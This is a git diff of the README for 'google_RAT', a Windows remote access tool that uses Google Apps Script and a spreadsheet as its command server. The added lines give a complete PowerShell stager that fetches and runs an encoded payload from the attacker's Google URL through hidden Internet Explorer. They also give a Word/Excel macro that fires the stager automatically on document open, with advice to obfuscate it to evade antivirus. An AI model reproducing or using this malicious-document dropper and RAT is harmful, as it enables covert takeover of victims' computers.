@@ -1,15 +1,11 @@
 # google_RAT
-A RAT (Remote Access Tool) for Windows systems using google apps script as the middle man
+A remote access tool for Windows systems using google apps script as the middle man
 
 **NOTE:** Current limit to data upload and download is 8.5 MB. This is due to the [limits of google sheets](https://gsuitetips.com/tips/sheets/google-spreadsheet-limitations/).
 
-## TODO
-* add timestamps to google drive output
-* implement data reset from `script.py` for a stale client
+# Setup
 
-## Setup
-
-### Deploying Google Server and Spreadsheet Database
+### Deploy Google Server and Spreadsheet Database
 * Create a fake Google account
 * Create a spreadsheet in the fake account's Google drive
 * Make it public:
@@ -26,11 +22,8 @@ A RAT (Remote Access Tool) for Windows systems using google apps script as the m
   * `Review Permissions` > Select your fake account > `Advanced` > `Go to Untitled project (unsafe)` > enter 'Continue' > `Allow`
   * Copy the URL and paste it into `$SRV` of `script.ps1`
 
-### Deploying Powershell Client
-**tldr** Test powershell obfuscated and base64 encoded command to server at (`https://script.google.com/macros/s/AKfycby62AAepUEJ69FoMfpZ9kOJgTZOc2dInSX2lhGlEEoDP_c-vp47/exec`):
-```
-powershell.exe -noE -NonI -nOpR -eNc <payload from server>
-```
+### Develop Powershell Payload
+
 * Run the following powershell to compress `script.ps1`:
 ```
 $s = gc <path to script.ps1>
@@ -48,23 +41,50 @@ $sx = $sx.replace('; ', ';')
 $sx = $sx.replace('} ', '}')
 $sx = $sx.replace('{ ', '{')
 $sx = $sx.replace(' {', '{')
-write-host $sx
-```
-* Download [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) and run the following obfuscation techniques:
-  * `Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'Command' 1`
-  * `Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'String' 2`
-  * `Out-ObfuscatedTokenCommand -ScriptBlock $ScriptBlock 'CommandArgument' 3`
-* Take the resulting obfuscated powershell and run the following powershell to produce the base64 encoded string:
-```
-$s = gc <path to file with obfuscated powershell command>
-$x = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($s))
+$x = [convert]::tobase64string([system.text.encoding]::unicode.getbytes($sx))
 write-host $x
 ```
-* Copy the above output into the following command: `powershell.exe -noE -NonI -nOpR -eNc <output>`
+* Take the base64 output and paste it into the `PAYLOAD` variable of `script.js` and republish the web server. Browse to the public google web server URL to see your base64 payload.
+
+### Embed Payload Stager into a Microsoft Document
+* Use the following powershell stager to run the payload (replace `<SRV>` with the URL of the google web server):
+```
+$i=new-object -com internetexplorer.application;
+$i.visible=$false;
+$i.silent=$true;
+$i.navigate2('<SRV>',14,0,$null,$null);
+while($i.busy -or ($i.readystate -ne 4)){sleep -seconds 1};
+$p=$i.document.lastchild.innertext;
+$i.quit();
+powershell.exe -v 2 -noE -NonI -nOpR -eNc $p;
+```
+* Here is an example Microsoft VBS macro used to call the above powershell stager. Production code should use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) on the `cmd` variable to help evade AV:
+```
+Private Sub run()
+    Dim cmd As String
+    cmd = "$i=new-object -com internetexplorer.application;$i.visible=$false;$i.silent=$true;$i.navigate2('<SRV>',14,0,$null,$null);while($i.busy -or ($i.readystate -ne 4)){sleep -seconds 1};$p=$i.document.lastchild.innertext;$i.quit();powershell.exe -v 2 -noE -NonI -nOpR -eNc $p;"
+    Set sh = CreateObject("WScript.Shell")
+    res = sh.run(cmd,0,True)
+End Sub
+'Word
+Sub AutoOpen()
+    run
+End Sub
+Sub AutoExec()
+    run
+End Sub
+'Excel
+Sub Auto_Open()
+    run
+End Sub
+Sub Auto_Exec()
+    run
+End Sub
+```
 
 ### Deploying Python Shell
 **NOTE:** Script requires python 3
-* Copy the public link to Google apps server (same one pasted into `script.ps1`) and run the following command
+* Copy the public link to the google apps server and run the following command:
   * `python script.py <url to google apps server>`
 * Fun test commands:
   * `(new-object -com SAPI.SpVoice).speak('self destruct in 9 8 7 6 5 4 3 2 1 boom')`
